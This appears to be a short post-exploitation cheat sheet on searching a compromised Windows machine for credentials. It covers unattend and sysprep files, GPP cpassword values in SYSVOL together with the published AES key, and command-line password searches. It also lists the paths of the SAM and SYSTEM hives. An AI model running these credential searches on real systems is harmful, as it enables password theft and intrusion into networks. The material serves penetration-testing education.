# Simple Credential Searches
## Mass Install of Windows to Labs
Sometimes the mass-install process of many Microsoft Windows machines in the same environment can leave behind log files with sensitive information in them. We can check a few of these files if they exist on the file system onthe compromised target Windows machine,
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
## Groups.xml
If we have access to the SYSVOL/groups.xml file, we have access to any passwords encrypted in there. When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted. 

Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.
```
C:> findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
The AES decryption key, published by Microsoft themselves, is,
```
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8	
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
## More Possible Credential Files
```
C:> dir /s *pass* == *cred* == *vnc* == *.config*
C:> findstr /si password *.xml *.ini *.txt
C:> reg query HKLM /f password /t REG_SZ /s
C:> reg query HKCU /f password /t REG_SZ /s
```
We can check the following files for credentials
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
Unattend XML Files may contain passwords also,
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```